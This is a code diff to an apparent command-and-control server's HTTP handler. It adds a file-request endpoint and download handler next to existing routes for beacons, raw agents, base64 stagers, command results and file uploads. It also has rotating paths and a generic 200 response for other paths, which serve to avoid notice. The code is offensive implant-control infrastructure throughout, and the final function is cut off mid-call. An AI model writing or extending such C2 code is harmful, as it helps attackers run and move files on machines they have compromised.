@@ -5,6 +5,7 @@ from handlers.beacon_handler import BeaconHandler
 from handlers.agent_handler import AgentHandler
 from handlers.file_handler import FileHandler
 from handlers.result_handler import ResultHandler
+from handlers.file_download_handler import FileDownloadHandler
 from core.path_routing import PathRouter
 from core.client_operations import ClientHelper
 from core.crypto_operations import CryptoHelper
@@ -31,7 +32,8 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             "agent_path": "/raw_agent",
             "stager_path": "/b64_stager",
             "cmd_result_path": "/command_result",
-            "file_upload_path": "/file_upload"
+            "file_upload_path": "/file_upload",
+            "file_request_path": "/file_request"
         }
         
         # Initialize path rotation
@@ -125,6 +127,8 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             self._handle_result()
         elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
             self._handle_file_upload()
+        elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+            self._handle_file_download()
         else:
             # Return a generic 200 response for unmatched paths
             self._handle_default()
@@ -176,6 +180,17 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     def _handle_file_upload(self):
         """Handle file upload requests using FileHandler"""
         handler = FileHandler(
+            self, 
+            self.client_manager, 
+            self.crypto_helper, 
+            self.client_helper, 
+            self.path_router
+        )
+        handler.handle()
+    
+    def _handle_file_download(self):
+        """Handle file download requests using FileDownloadHandler"""
+        handler = FileDownloadHandler(
             self, 
             self.client_manager, 
             self.crypto_helper, 
